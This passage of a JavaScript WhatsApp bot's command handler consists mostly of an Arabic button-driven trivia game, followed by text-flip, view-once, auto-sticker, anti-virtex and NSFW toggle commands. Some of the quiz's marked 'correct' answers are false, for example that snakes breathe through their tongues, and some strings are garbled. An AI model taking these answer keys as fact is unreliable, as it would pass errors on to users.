"*•  احسنت يروح قلبي إجابتك صحيحة  😂♥️*\n\n*☸️ › السؤال السادس*\n\n*•  ماهي اللغة الرسمية للارجنتين؟*\n",
"*•   إجابتك صحيحة يحب 😂♥️*\n\n*☸️ › السؤال السادس*\n\n*•  ماهي اللغة الرسمية للارجنتين؟*\n",
"*•   إجابتك صحيحة يعمري😂♥️*\n\n*☸️ › السؤال السادس*\n\n*•  ماهي اللغة الرسمية للارجنتين؟*\n"
]
    const xeondddaswkk = ddaswkk[Math.floor(Math.random() * ddaswkk.length)]
    bufferddaswkk = await getBuffer(`https://telegra.ph/file/ce6d860bb9b97d297ab7b.jpg`)
    let bbddaswkk = [
        {buttonId: `r18`, buttonText: {displayText: 'الإسبانية  ' }, type: 1},
		{buttonId: `wwwq`, buttonText: {displayText: 'الفرنسية' }, type: 1},
		{buttonId: `wwwq`, buttonText: {displayText: 'الانجليزية' }, type: 1}
        ] 
    XeonBotInc.sendMessage(from, { buttons: bbddaswkk, image: bufferddaswkk, caption: ''+ xeondddaswkk }, {quoted:m})
    break
case 'r18':    
    const fgfeferftt =[
"*•  احسنت يا صديقي إجابتك صحيحة  😂♥️*\n\n*☸️ › السؤال السابع*\n\n*•  ما هو أكبر محيط في العالم؟*\n",
"*•  احسنت يقلبي إجابتك صحيحة  😂♥️*\n\n*☸️ › السؤال السابع*\n\n*•  ما هو أكبر محيط في العالم؟*\n",
"*•  احسنت يروح قلبي إجابتك صحيحة  😂♥️*\n\n*☸️ › السؤال السابع*\n\n*•  ما هو أكبر محيط في العالم؟*\n",
"*•   إجابتك صحيحة يحب 😂♥️*\n\n*☸️ › السؤال السابع*\n\n*•  ما هو أكبر محيط في العالم؟*\n",
"*•   إجابتك صحيحة يعمري😂♥️*\n\n*☸️ › السؤال السابع*\n\n*•  ما هو أكبر محيط في العالم؟*\n"
]
    const xeondfgfeferftt = fgfeferftt[Math.floor(Math.random() * fgfeferftt.length)]
    bufferfgfeferftt = await getBuffer(`https://telegra.ph/file/ce6d860bb9b97d297ab7b.jpg`)
    let bbfgfeferftt = [
        {buttonId: `r19`, buttonText: {displayText: 'الهادي ' }, type: 1},
		{buttonId: `wwwq`, buttonText: {displayText: 'الهندي ' }, type: 1},
		{buttonId: `wwwq`, buttonText: {displayText: 'الاطلنطي' }, type: 1}
        ] 
    XeonBotInc.sendMessage(from, { buttons: bbfgfeferftt, image: bufferfgfeferftt, caption: ''+ xeondfgfeferftt }, {quoted:m})
    break
case 'r19':    
    const fgfrftt =[
"*•  احسنت يا صديقي إجابتك صحيحة  😂♥️*\n\n*☸️ › السؤال الثامن*\n\n*•  ماذا تعني كلمة جنكيزخان ؟*\n",
"*•  احسنت يقلبي إجابتك صحيحة  😂♥️*\n\n*☸️ › السؤال الثامن*\n\n*•  ماذا تعني كلمة جنكيزخان ؟*\n",
"*•  احسنت يروح قلبي إجابتك صحيحة  😂♥️*\n\n*☸️ › السؤال الثامن*\n\n*•  ماذا تعني كلمة جنكيزخان ؟*\n",
"*•   إجابتك صحيحة يحب 😂♥️*\n\n*☸️ › السؤال الثامن*\n\n*•  ماذا تعني كلمة جنكيزخان ؟*\n",
"*•   إجابتك صحيحة يعمري😂♥️*\n\n*☸️ › السؤال الثامن*\n\n*•  ماذا تعني كلمة جنكيزخان ؟*\n"
]
    const xeondfgfrftt = fgfrftt[Math.floor(Math.random() * fgfrftt.length)]
    bufferfgfrftt = await getBuffer(`https://telegra.ph/file/ce6d860bb9b97d297ab7b.jpg`)
    let bbfgfrftt = [
        {buttonId: `wwwq`, buttonText: {displayText: 'الكبرياء ' }, type: 1},
		{buttonId: `r20`, buttonText: {displayText: 'القوة  ' }, type: 1},
		{buttonId: `wwwq`, buttonText: {displayText: 'الغرور ' }, type: 1}
        ] 
    XeonBotInc.sendMessage(from, { buttons: bbfgfrftt, image: bufferfgfrftt, caption: ''+ xeondfgfrftt }, {quoted:m})
    break
case 'r20':    
    const efefevvvvcxx =[
"*•  احسنت يا صديقي إجابتك صحيحة  😂♥️*\n\n*☸️ › السؤال التاسع*\n\n*•  ما سعة جسم الانسان من الدم؟*\n",
"*•  احسنت يقلبي إجابتك صحيحة  😂♥️*\n\n*☸️ › السؤال التاسع*\n\n*•  ما سعة جسم الانسان من الدم؟*\n",
"*•  احسنت يروح قلبي إجابتك صحيحة  😂♥️*\n\n*☸️ › السؤال التاسع*\n\n*•  ما سعة جسم الانسان من الدم؟*\n",
"*•   إجابتك صحيحة يحب 😂♥️*\n\n*☸️ › السؤال التاسع*\n\n*•  ما سعة جسم الانسان من الدم؟*\n",
"*•   إجابتك صحيحة يعمري😂♥️*\n\n*☸️ › السؤال التاسع*\n\n*•  ما سعة جسم الانسان من الدم؟*\n"
]
    const xeondefefevvvvcxx = efefevvvvcxx[Math.floor(Math.random() * efefevvvvcxx.length)]
    bufferefefevvvvcxx = await getBuffer(`https://telegra.ph/file/ce6d860bb9b97d297ab7b.jpg`)
    let bbefefevvvvcxx = [
        {buttonId: `wwwq`, buttonText: {displayText: '5 لترات ' }, type: 1},
		{buttonId: `r21`, buttonText: {displayText: '6 لترات  ' }, type: 1},
		{buttonId: `wwwq`, buttonText: {displayText: '4 لترات' }, type: 1}
        ] 
    XeonBotInc.sendMessage(from, { buttons: bbefefevvvvcxx, image: bufferefefevvvvcxx, caption: ''+ xeondefefevvvvcxx }, {quoted:m})
    break
case 'r21':    
    const efefevcxx =[
"*•  احسنت يا صديقي إجابتك صحيحة  😂♥️*\n\n*☸️ › السؤال العاشر*\n\n*•  اين يوجد الجبل الاخضر؟*\n",
"*•  احسنت يقلبي إجابتك صحيحة  😂♥️*\n\n*☸️ › السؤال العاشر*\n\n*•  اين يوجد الجبل الاخضر؟*\n",
"*•  احسنت يروح قلبي إجابتك صحيحة  😂♥️*\n\n*☸️ › السؤال العاشر*\n\n*•  اين يوجد الجبل الاخضر؟*\n",
"*•   إجابتك صحيحة يحب 😂♥️*\n\n*☸️ › السؤال العاشر*\n\n*•  اين يوجد الجبل الاخضر؟*\n",
"*•   إجابتك صحيحة يعمري😂♥️*\n\n*☸️ › السؤال العاشر*\n\n*•  اين يوجد الجبل الاخضر؟*\n"
]
    const xeondefefevcxx = efefevcxx[Math.floor(Math.random() * efefevcxx.length)]
    bufferefefevcxx = await getBuffer(`https://telegra.ph/file/ce6d860bb9b97d297ab7b.jpg`)
    let bbefefevcxx = [
        {buttonId: `wwwq`, buttonText: {displayText: 'السعوديه ' }, type: 1},
		{buttonId: `wwwq`, buttonText: {displayText: 'اليمن  ' }, type: 1},
		{buttonId: `r22`, buttonText: {displayText: 'عمان ' }, type: 1}
        ] 
    XeonBotInc.sendMessage(from, { buttons: bbefefevcxx, image: bufferefefevcxx, caption: ''+ xeondefefevcxx }, {quoted:m})
    break
case 'r22':    
    const xxxsasa =[
"*•  احسنت يا صديقي إجابتك صحيحة  😂♥️*\n\n*•  احسنت يا بطل الأبطال لقد تخطيت المستوي الثاني وهو المتوسط انتقل لأخر المستويات الان  🥳😍*\n\n*•  يلا نكمل يبطلي 🤭❤️*\n",
"*•  احسنت يقلبي إجابتك صحيحة  😂♥️*\n\n*•  احسنت يا بطل الأبطال لقد تخطيت المستوي الثاني وهو المتوسط انتقل لأخر المستويات الان  🥳😍*\n\n*•  يلا نكمل يبطلي 🤭❤️*\n",
"*•  احسنت يروح قلبي إجابتك صحيحة  😂♥️*\n\n*•  احسنت يا بطل الأبطال لقد تخطيت المستوي الثاني وهو المتوسط انتقل لأخر المستويات الان 🥳😍*\n\n*•  يلا نكمل يبطلي 🤭❤️*\n",
"*•   إجابتك صحيحة يحب 😂♥️*\n\n*•  احسنت يا بطل الأبطال لقد تخطيت المستوي الثاني وهو المتوسط انتقل لأخر المستويات الان 🥳😍*\n\n*•  يلا نكمل يبطلي 🤭❤️*\n",
"*•   إجابتك صحيحة يعمري😂♥️*\n\n*•  احسنت يا بطل الأبطال لقد تخطيت المستوي الثاني وهو المتوسط انتقل لأخر المستويات الان 🥳😍*\n\n*•  يلا نكمل يبطلي 🤭❤️*\n"
]
    const xeondxxxsasa = xxxsasa[Math.floor(Math.random() * xxxsasa.length)]
    bufferxxxsasa = await getBuffer(`https://telegra.ph/file/ce6d860bb9b97d297ab7b.jpg`)
    let bbxxxsasa = [
		{buttonId: `r23`, buttonText: {displayText: 'انتقل إلي المستوي الأخير ' }, type: 1}
        ] 
    XeonBotInc.sendMessage(from, { buttons: bbxxxsasa, image: bufferxxxsasa, caption: ''+ xeondxxxsasa }, {quoted:m})
    break
///--------------- تالت -------\\\

case 'r23':    
    const xxssxsasa =[
"*•  احسنت يا صديقي إجابتك صحيحة  😂♥️*\n\n*☸️ › السؤال الاول*\n\n*•  ما هي السورة التي كانت سببا في إسلام عمر بن الخطاب رضي الله عنه ؟*\n",
"*•  احسنت يقلبي إجابتك صحيحة  😂♥️*\n\n*☸️ › السؤال الاول*\n\n*•  ما هي السورة التي كانت سببا في إسلام عمر بن الخطاب رضي الله عنه ؟*\n",
"*•  احسنت يروح قلبي إجابتك صحيحة  😂♥️*\n\n*☸️ › السؤال الاول*\n\n**•  ما هي السورة التي كانت سببا في إسلام عمر بن الخطاب رضي الله عنه ؟*\n",
"*•   إجابتك صحيحة يحب 😂♥️*\n\n*☸️ › السؤال الاول*\n\n*•  ما هي السورة التي كانت سببا في إسلام عمر بن الخطاب رضي الله عنه ؟*\n",
"*•   إجابتك صحيحة يعمري😂♥️*\n\n*☸️ › السؤال الاول*\n\n*•  ما هي السورة التي كانت سببا في إسلام عمر بن الخطاب رضي الله عنه ؟*n"
]
    const xeondxxssxsasa = xxssxsasa[Math.floor(Math.random() * xxssxsasa.length)]
    bufferxxssxsasa = await getBuffer(`https://telegra.ph/file/ce6d860bb9b97d297ab7b.jpg`)
    let bbxxssxsasa = [
		{buttonId: `wwwq`, buttonText: {displayText: 'المطففين' }, type: 1},
		{buttonId: `wwwq`, buttonText: {displayText: 'العمران  ' }, type: 1},
		{buttonId: `r24`, buttonText: {displayText: 'طه  ' }, type: 1}
        ] 
    XeonBotInc.sendMessage(from, { buttons: bbxxssxsasa, image: bufferxxssxsasa, caption: ''+ xeondxxssxsasa }, {quoted:m})
    break
case 'r24':    
    const aqqqqxds =[
"*•  احسنت يا صديقي إجابتك صحيحة  😂♥️*\n\n*☸️ › السؤال الثاني*\n\n*•  ما هي الدولة العربية التي يمر بها خط الاستواء ؟*\n",
"*•  احسنت يقلبي إجابتك صحيحة  😂♥️*\n\n*☸️ › السؤال الثاني*\n\n*•  ما هي الدولة العربية التي يمر بها خط الاستواء ؟*\n",
"*•  احسنت يروح قلبي إجابتك صحيحة  😂♥️*\n\n*☸️ › السؤال الثاني*\n\n*•  ما هي الدولة العربية التي يمر بها خط الاستواء ؟*\n",
"*•   إجابتك صحيحة يحب 😂♥️*\n\n*☸️ › السؤال الثاني*\n\n*•  ما هي الدولة العربية التي يمر بها خط الاستواء ؟*\n",
"*•   إجابتك صحيحة يعمري😂♥️*\n\n*☸️ › السؤال الثاني*\n\n*•  ما هي الدولة العربية التي يمر بها خط الاستواء ؟*\n"
]
    const xeondaqqqqxds = aqqqqxds[Math.floor(Math.random() * aqqqqxds.length)]
    bufferaqqqqxds = await getBuffer(`https://telegra.ph/file/ce6d860bb9b97d297ab7b.jpg`)
    let bbaqqqqxds = [
		{buttonId: `r25`, buttonText: {displayText: 'الصومال' }, type: 1},
		{buttonId: `wwwq`, buttonText: {displayText: 'ماليزيا  ' }, type: 1},
		{buttonId: `wwwq`, buttonText: {displayText: 'السودان ' }, type: 1}
        ] 
    XeonBotInc.sendMessage(from, { buttons: bbaqqqqxds, image: bufferaqqqqxds, caption: ''+ xeondaqqqqxds }, {quoted:m})
    break
case 'r25':    
    const awwqqxds =[
"*•  احسنت يا صديقي إجابتك صحيحة  😂♥️*\n\n*☸️ › السؤال الثالث*\n\n*•  انجلترا لا تضع إسمها على؟*\n",
"*•  احسنت يقلبي إجابتك صحيحة  😂♥️*\n\n*☸️ › السؤال الثالث*\n\n*•  انجلترا لا تضع إسمها على؟*\n",
"*•  احسنت يروح قلبي إجابتك صحيحة  😂♥️*\n\n*☸️ › السؤال الثالث*\n\n*•  انجلترا لا تضع إسمها على؟*\n",
"*•   إجابتك صحيحة يحب 😂♥️*\n\n*☸️ › السؤال الثالث*\n\n*•  انجلترا لا تضع إسمها على؟*\n",
"*•   إجابتك صحيحة يعمري😂♥️*\n\n*☸️ › السؤال الثالث*\n\n*•  انجلترا لا تضع إسمها على؟*\n"
]
    const xeondawwqqxds = awwqqxds[Math.floor(Math.random() * awwqqxds.length)]
    bufferawwqqxds = await getBuffer(`https://telegra.ph/file/ce6d860bb9b97d297ab7b.jpg`)
    let bbawwqqxds = [
		{buttonId: `r26`, buttonText: {displayText: 'الطوابع' }, type: 1},
		{buttonId: `wwwq`, buttonText: {displayText: 'الاموال ' }, type: 1},
		{buttonId: `wwwq`, buttonText: {displayText: 'الورق ' }, type: 1}
        ] 
    XeonBotInc.sendMessage(from, { buttons: bbawwqqxds, image: bufferawwqqxds, caption: ''+ xeondawwqqxds }, {quoted:m})
    break
case 'r26':    
    const wwqewq =[
"*•  احسنت يا صديقي إجابتك صحيحة  😂♥️*\n\n*☸️ › السؤال الرابع*\n\n*•  عدد غرف البيت الأبيض؟*\n",
"*•  احسنت يقلبي إجابتك صحيحة  😂♥️*\n\n*☸️ › السؤال الرابع*\n\n*•  عدد غرف البيت الأبيض؟*\n",
"*•  احسنت يروح قلبي إجابتك صحيحة  😂♥️*\n\n*☸️ › السؤال الرابع*\n\n*•  عدد غرف البيت الأبيض؟*\n",
"*•   إجابتك صحيحة يحب 😂♥️*\n\n*☸️ › السؤال الرابع*\n\n*•  عدد غرف البيت الأبيض؟*\n",
"*•   إجابتك صحيحة يعمري😂♥️*\n\n*☸️ › السؤال الرابع*\n\n*•  عدد غرف البيت الأبيض؟*\n"
]
    const xeondwwqewq = wwqewq[Math.floor(Math.random() * wwqewq.length)]
    bufferwwqewq = await getBuffer(`https://telegra.ph/file/ce6d860bb9b97d297ab7b.jpg`)
    let bbwwqewq = [
		{buttonId: `wwwq`, buttonText: {displayText: '126 غرفة' }, type: 1},
		{buttonId: `wwwq`, buttonText: {displayText: '110 غرفة' }, type: 1},
		{buttonId: `r27`, buttonText: {displayText: '143 غرفة ' }, type: 1}
        ] 
    XeonBotInc.sendMessage(from, { buttons: bbwwqewq, image: bufferwwqewq, caption: ''+ xeondwwqewq }, {quoted:m})
    break
case 'r27':    
    const dwwxccbnm =[
"*•  احسنت يا صديقي إجابتك صحيحة  😂♥️*\n\n*☸️ › السؤال الخامس*\n\n*•  الحيوان الذي يقوم ذكرة بمهمة الحمل بدلاً من الأنثى هو ؟*\n",
"*•  احسنت يقلبي إجابتك صحيحة  😂♥️*\n\n*☸️ › السؤال الخامس*\n\n*•  الحيوان الذي يقوم ذكرة بمهمة الحمل بدلاً من الأنثى هو ؟*\n",
"*•  احسنت يروح قلبي إجابتك صحيحة  😂♥️*\n\n*☸️ › السؤال الخامس*\n\n*•  الحيوان الذي يقوم ذكرة بمهمة الحمل بدلاً من الأنثى هو ؟*\n",
"*•   إجابتك صحيحة يحب 😂♥️*\n\n*☸️ › السؤال الخامس*\n\n*•  الحيوان الذي يقوم ذكرة بمهمة الحمل بدلاً من الأنثى هو ؟*\n",
"*•   إجابتك صحيحة يعمري😂♥️*\n\n*☸️ › السؤال الخامس*\n\n*•  الحيوان الذي يقوم ذكرة بمهمة الحمل بدلاً من الأنثى هو ؟*\n"
]
    const xeonddwwxccbnm = dwwxccbnm[Math.floor(Math.random() * dwwxccbnm.length)]
    bufferdwwxccbnm = await getBuffer(`https://telegra.ph/file/ce6d860bb9b97d297ab7b.jpg`)
    let bbdwwxccbnm = [
		{buttonId: `wwwq`, buttonText: {displayText: 'فرس النهر' }, type: 1},
		{buttonId: `wwwq`, buttonText: {displayText: 'الدب' }, type: 1},
		{buttonId: `r28`, buttonText: {displayText: 'حصان البحر  ' }, type: 1}
        ] 
    XeonBotInc.sendMessage(from, { buttons: bbdwwxccbnm, image: bufferdwwxccbnm, caption: ''+ xeonddwwxccbnm }, {quoted:m})
    break

//------------$$$----------------\\\

	
case 'r28':    
    const wwaaaaxccbnm =[
"*•  احسنت يا صديقي إجابتك صحيحة  😂♥️*\n\n*☸️ › السؤال السادس*\n\n*•  القرامطة سرقوا الحجر الأسود من مكة المكرمة وأعادوه بعد؟*\n",
"*•  احسنت يقلبي إجابتك صحيحة  😂♥️*\n\n*☸️ › السؤال السادس*\n\n*•  القرامطة سرقوا الحجر الأسود من مكة المكرمة وأعادوه بعد؟*\n",
"*•  احسنت يروح قلبي إجابتك صحيحة  😂♥️*\n\n*☸️ › السؤال السادس*\n\n*•  القرامطة سرقوا الحجر الأسود من مكة المكرمة وأعادوه بعد؟*\n",
"*•   إجابتك صحيحة يحب 😂♥️*\n\n*☸️ › السؤال السادس*\n\n*•  القرامطة سرقوا الحجر الأسود من مكة المكرمة وأعادوه بعد؟*\n",
"*•   إجابتك صحيحة يعمري😂♥️*\n\n*☸️ › السؤال السادس*\n\n*•  القرامطة سرقوا الحجر الأسود من مكة المكرمة وأعادوه بعد؟*\n"
]
    const xeondwwaaaaxccbnm = wwaaaaxccbnm[Math.floor(Math.random() * wwaaaaxccbnm.length)]
    bufferwwaaaaxccbnm = await getBuffer(`https://telegra.ph/file/ce6d860bb9b97d297ab7b.jpg`)
    let bbwwaaaaxccbnm = [
		{buttonId: `wwwq`, buttonText: {displayText: '11 عام' }, type: 1},
		{buttonId: `r29`, buttonText: {displayText: '22 عام' }, type: 1},
		{buttonId: `wwwq`, buttonText: {displayText: '33 عام ' }, type: 1}
        ] 
    XeonBotInc.sendMessage(from, { buttons: bbwwaaaaxccbnm, image: bufferwwaaaaxccbnm, caption: ''+ xeondwwaaaaxccbnm }, {quoted:m})
    break
case 'r29':    
    const cvbnmmmmmm =[
"*•  احسنت يا صديقي إجابتك صحيحة  😂♥️*\n\n*☸️ › السؤال السابع\n\n*• من الشعب الذي ابتكر التقويم الشمسي؟*\n",
"*•  احسنت يقلبي إجابتك صحيحة  😂♥️\n\n*☸️ › السؤال السابع\n\n*• من الشعب الذي ابتكر التقويم الشمسي؟*\n",
"*•  احسنت يروح قلبي إجابتك صحيحة  😂♥️*☸️ › السؤال السابع\n\n*• من الشعب الذي ابتكر التقويم الشمسي؟*\n",
"*•   إجابتك صحيحة يحب 😂♥️*\n\n*☸️ › السؤال السابع\n\n*• من الشعب الذي ابتكر التقويم الشمسي؟*\n",
"*•   إجابتك صحيحة يعمري😂♥️*\n\n*☸️ › السؤال السابع\n\n*• من الشعب الذي ابتكر التقويم الشمسي؟*\n"
]
    const xeondcvbnmmmmmm = cvbnmmmmmm[Math.floor(Math.random() * cvbnmmmmmm.length)]
    buffercvbnmmmmmm = await getBuffer(`https://telegra.ph/file/ce6d860bb9b97d297ab7b.jpg`)
    let bbcvbnmmmmmm = [
		{buttonId: `wwwq`, buttonText: {displayText: 'الإغريق' }, type: 1},
		{buttonId: `r30`, buttonText: {displayText: 'المصريين القدماء' }, type: 1},
		{buttonId: `wwwq`, buttonText: {displayText: 'اليونانيين' }, type: 1}
        ] 
    XeonBotInc.sendMessage(from, { buttons: bbcvbnmmmmmm, image: buffercvbnmmmmmm, caption: ''+ xeondcvbnmmmmmm }, {quoted:m})
    break	
case 'r30':    
    const mnbnbnnn =[
"*•  احسنت يا صديقي إجابتك صحيحة  😂♥️*\n\n*☸️ › السؤال الثامن\n\n*• مما هو الحيوان الذي يتنفس بلسانه؟*\n",
"*•  احسنت يقلبي إجابتك صحيحة  😂♥️*\n\n*☸️ › السؤال الثامن\n\n*• مما هو الحيوان الذي يتنفس بلسانه؟*\n",
"*•  احسنت يروح قلبي إجابتك صحيحة  😂♥️*\n\n*☸️ › السؤال الثامن\n\n*• مما هو الحيوان الذي يتنفس بلسانه؟*\n",
"*•   إجابتك صحيحة يحب 😂♥️*\n\n*☸️ › السؤال الثامن\n\n*• مما هو الحيوان الذي يتنفس بلسانه؟*\n",
"*•   إجابتك صحيحة يعمري😂♥️*\n\n*☸️ › السؤال الثامن\n\n*• مما هو الحيوان الذي يتنفس بلسانه؟*\n"
]
    const xeondmnbnbnnn = mnbnbnnn[Math.floor(Math.random() * mnbnbnnn.length)]
    buffermnbnbnnn = await getBuffer(`https://telegra.ph/file/ce6d860bb9b97d297ab7b.jpg`)
    let bbmnbnbnnn = [
		{buttonId: `wwwq`, buttonText: {displayText: 'التمساح' }, type: 1},
		{buttonId: `wwwq`, buttonText: {displayText: 'السمك' }, type: 1},
		{buttonId: `r31`, buttonText: {displayText: 'الثعبان' }, type: 1}
        ] 
    XeonBotInc.sendMessage(from, { buttons: bbmnbnbnnn, image: buffermnbnbnnn, caption: ''+ xeondmnbnbnnn }, {quoted:m})
    break

case 'r31':    
    const nnnnbvcc =[
"*•  احسنت يا صديقي إجابتك صحيحة  😂♥️*\n\n*☸️ › السؤال التاسع\n\n*• كم عدد الناجين من سفينة التايتنك؟*\n",
"*•  احسنت يقلبي إجابتك صحيحة  😂♥️*\n\n*☸️ › السؤال التاسع\n\n*• كم عدد الناجين من سفينة التايتنك؟*\n",
"*•  احسنت يروح قلبي إجابتك صحيحة  😂♥️*\n\n*☸️ › السؤال التاسع\n\n*• كم عدد الناجين من سفينة التايتنك؟*\n",
"*•   إجابتك صحيحة يحب 😂♥️*\n\n*☸️ › السؤال التاسع\n\n*• كم عدد الناجين من سفينة التايتنك؟*\n",
"*•   إجابتك صحيحة يعمري😂♥️*\n\n*☸️ › السؤال التاسع\n\n*• كم عدد الناجين من سفينة التايتنك؟*\n"
]
    const xeondnnnnbvcc = nnnnbvcc[Math.floor(Math.random() * nnnnbvcc.length)]
    buffernnnnbvcc = await getBuffer(`https://telegra.ph/file/ce6d860bb9b97d297ab7b.jpg`)
    let bbnnnnbvcc = [
		{buttonId: `wwwq`, buttonText: {displayText: '206' }, type: 1},
		{buttonId: `wwwq`, buttonText: {displayText: '406' }, type: 1},
		{buttonId: `r32`, buttonText: {displayText: '706' }, type: 1}
        ] 
    XeonBotInc.sendMessage(from, { buttons: bbnnnnbvcc, image: buffernnnnbvcc, caption: ''+ xeondnnnnbvcc }, {quoted:m})
    break
case 'r32':    
    const ccxcxc =[
"*•  احسنت يا صديقي إجابتك صحيحة  😂♥️*\n\n*☸️ › السؤال العاشر*\n\n*• من هو الحيوان الذي لا يعد من الزواحف من قائمة الحيوانات الآتية ؟*\n",
"*•  احسنت يقلبي إجابتك صحيحة  😂♥️*\n\n*☸️ › السؤال العاشر*\n\n*• من هو الحيوان الذي لا يعد من الزواحف من قائمة الحيوانات الآتية ؟*\n",
"*•  احسنت يروح قلبي إجابتك صحيحة  😂♥️*\n\n*☸️ › السؤال العاشر*\n\n*• من هو الحيوان الذي لا يعد من الزواحف من قائمة الحيوانات الآتية ؟*\n",
"*•   إجابتك صحيحة يحب 😂♥️*\n\n*☸️ › السؤال العاشر*\n\n*• من هو الحيوان الذي لا يعد من الزواحف من قائمة الحيوانات الآتية ؟*\n",
"*•   إجابتك صحيحة يعمري😂♥️*\n\n*☸️ › السؤال العاشر*\n\n*• من هو الحيوان الذي لا يعد من الزواحف من قائمة الحيوانات الآتية ؟*\n"
]
    const xeondccxcxc = ccxcxc[Math.floor(Math.random() * ccxcxc.length)]
    bufferccxcxc = await getBuffer(`https://telegra.ph/file/ce6d860bb9b97d297ab7b.jpg`)
    let bbccxcxc = [
		{buttonId: `r33`, buttonText: {displayText: 'الضفدع' }, type: 1},
		{buttonId: `wwwq`, buttonText: {displayText: 'السلحفاه' }, type: 1},
		{buttonId: `wwwq`, buttonText: {displayText: 'السحليه' }, type: 1}
        ] 
    XeonBotInc.sendMessage(from, { buttons: bbccxcxc, image: bufferccxcxc, caption: ''+ xeondccxcxc }, {quoted:m})
    break
case 'r33':    
    const qazqaqzzzu =[
"*•  احسنت يا صديقي إجابتك صحيحة  😂♥️*\n\n*•  تم الانتهاء من جميع الاسئله بنجاح عاش يا بطل 💕😂*\n\n*• بطلي يروحي قلبي 🥺💞*\n",
"*•  احسنت يقلبي إجابتك صحيحة  😂♥️*\n\n*•  تم الانتهاء من جميع الاسئله بنجاح عاش يا بطل 💕😂*\n\n*• بطلي يروحي قلبي 🥺💞*\n",
"*•  احسنت يروح قلبي إجابتك صحيحة  😂♥️*\n\n*•  تم الانتهاء من جميع الاسئله بنجاح عاش يا بطل 💕😂*\n\n*• بطلي يروحي قلبي 🥺💞*\n",
"*•   إجابتك صحيحة يحب 😂♥️*\n\n*•  تم الانتهاء من جميع الاسئله بنجاح عاش يا بطل 💕😂*\n\n*• بطلي يروحي قلبي 🥺💞*\n",
"*•   إجابتك صحيحة يعمري😂♥️*\n\n*•  تم الانتهاء من جميع الاسئله بنجاح عاش يا بطل 💕😂*\n\n*• بطلي يروحي قلبي 🥺💞*\n"
]
    const xeondqazqaqzzzu = qazqaqzzzu[Math.floor(Math.random() * qazqaqzzzu.length)]
    bufferqazqaqzzzu = await getBuffer(`https://telegra.ph/file/ce6d860bb9b97d297ab7b.jpg`)
    let bbqazqaqzzzu = [
		{buttonId: `aginna`, buttonText: {displayText: 'إعادة اللعبة' }, type: 1},
        {buttonId: `owner`, buttonText: {displayText: 'المطور' }, type: 1}
        ] 
    XeonBotInc.sendMessage(from, { buttons: bbqazqaqzzzu, image: bufferqazqaqzzzu, caption: ''+ xeondqazqaqzzzu }, {quoted:m})
    break
    
//--------- نهاية لعبة--------///


case 'fliptext': {
if (args.length < 1) return m.reply(`Example:\n${prefix}fliptext ${ownername}`)
quere = args.join(" ")
flipe = quere.split('').reverse().join('')
m.reply(`\`\`\`ã€Œ FLIP TEXT ã€\`\`\`\n*â€¢> Normal :*\n${quere}\n*â€¢> Flip :*\n${flipe}`)
}
break
case 'toviewonce': case 'toonce': { 
        if (!quoted) return m.reply(`Reply image`)
        if (/image/.test(mime)) {
anuoncr2 = await XeonBotInc.downloadAndSaveMediaMessage(quoted)
XeonBotInc.sendMessage(m.chat, {image: {url: anuoncr2},viewOnce : true},{quoted: m })
        } else if (/video/.test(mime)) {
        anuonce2 = await XeonBotInc.downloadAndSaveMediaMessage(quoted)
        XeonBotInc.sendMessage(m.chat, {video: {url: anuonce2},viewOnce : true},{quoted: m })
        }
        }
        break
case 'autostickergc':
            case 'autosticker':
if (!m.isGroup) return m.reply(mess.group)
if (!isBotAdmins) return m.reply(mess.botAdmin)
if (!isAdmins && !isCreator) return m.reply(mess.admin)
if (args.length < 1) return m.reply('type auto sticker on to enable\ntype auto sticker off to disable')
if (args[0]  === 'on'){
if (isAutoSticker) return m.reply(`Already activated`)
autosticker.push(from)
fs.writeFileSync('./database/autosticker.json', JSON.stringify(autosticker))
m.reply('autosticker activated')
} else if (args[0] === 'off'){
let anuticker1 = autosticker.indexOf(from)
autosticker.splice(anuticker1, 1)
fs.writeFileSync('./database/autosticker.json', JSON.stringify(autosticker))
m.reply('auto sticker deactivated')
}
break
case 'antivirus': case 'antivirtex': {
if (!m.isGroup) return m.reply(mess.group)
if (!isBotAdmins) return m.reply(mess.botAdmin)
if (!isAdmins && !isCreator) return m.reply(mess.admin)
if (args[0] === "on") {
if (antiVirtex) return m.reply('Already activated')
ntvirtex.push(from)
fs.writeFileSync('./database/antivirus.json', JSON.stringify(ntvirtex))
m.reply('Success in turning on antivirus in this group')
var groupe = await XeonBotInc.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
XeonBotInc.sendMessage(from, {text: `\`\`\`ã€Œ âš ï¸Warningâš ï¸ ã€\`\`\`\n\nNo body is allowed to send virus in this group, member who send will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!antiVirtex) return m.reply('Already deactivated')
let off = ntvirtex.indexOf(from)
ntvirtex.splice(off, 1)
fs.writeFileSync('./database/antivirus.json', JSON.stringify(ntvirtex))
m.reply('Success in turning off antivirus this group')
} else {
  let buttonsntvirtex = [
  { buttonId: `${command} on`, buttonText: { displayText: 'On' }, type: 1 },
  { buttonId: `${command} off`, buttonText: { displayText: 'Off' }, type: 1 }
  ]
  await XeonBotInc.sendButtonText(m.chat, buttonsntvirtex, `Please click the button below\n\nOn to enable\nOff to disable`, `${global.botname}`, m)
  }
  }
  break
case 'nsfw': {
if (!m.isGroup) return m.reply(mess.group)
if (!isBotAdmins) return m.reply(mess.botAdmin)
if (!isAdmins && !isCreator) return m.reply(mess.admin)
if (args[0] === "on") {
if (AntiNsfw) return m.reply('Already activated')
ntnsfw.push(from)
fs.writeFileSync('./database/nsfw.json', JSON.stringify(ntnsfw))
m.reply('Success in turning on nsfw in this group')
var groupe = await XeonBotInc.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
XeonBotInc.sendMessage(from, {text: `\`\`\`ã€Œ âš ï¸Warningâš ï¸ ã€\`\`\`\n\nNsfw(not safe for work) feature has been enabled in this group, which means one can access sexual graphics from the bot!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiNsfw) return m.reply('Already deactivated')
let off = ntnsfw.indexOf(from)
ntnsfw.splice(off, 1)
fs.writeFileSync('./database/nsfw.json', JSON.stringify(ntnsfw))
m.reply('Success in turning off nsfw in this group')
} else {
  let buttonsntnsfw = [
  { buttonId: `${command} on`, buttonText: { displayText: 'On' }, type: 1 },
  { buttonId: `${command} off`, buttonText: { displayText: 'Off' }, type: 1 }
  ]
